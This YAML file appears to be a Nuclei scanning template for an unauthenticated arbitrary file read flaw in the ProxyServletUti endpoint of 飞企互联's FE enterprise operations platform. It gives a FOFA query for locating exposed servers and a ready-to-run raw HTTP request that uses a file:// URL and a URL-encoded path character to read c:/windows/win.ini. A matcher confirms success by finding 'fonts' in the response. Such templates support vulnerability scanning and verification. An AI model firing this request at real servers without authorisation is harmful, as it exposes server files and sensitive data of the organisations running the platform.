id: feiqi-fe-platform-proxyservletuti-file-read

info:
  name: "飞企互联 FE 企业运营管理平台 ProxyServletUti 接口任意文件读取漏洞"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: app="FE-协作平台"
      飞企互联FE企业运营管理平台的ProxyServletUti接口存在文件读取漏洞，攻击者可通过构造恶意请求读取服务器任意文件内容，可能导致敏感数据泄露。该漏洞利用无需身份验证，存在较高安全风险。
  tags: 飞企互联

http:
- raw:
  - |
    GET /ProxyServletUti%6c?url=file:///c:/windows/win.ini HTTP/1.1
    Host: {{Hostname}}
    Accept-Charset: utf-8
    Accept-Encoding: gzip, deflate
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'fonts'
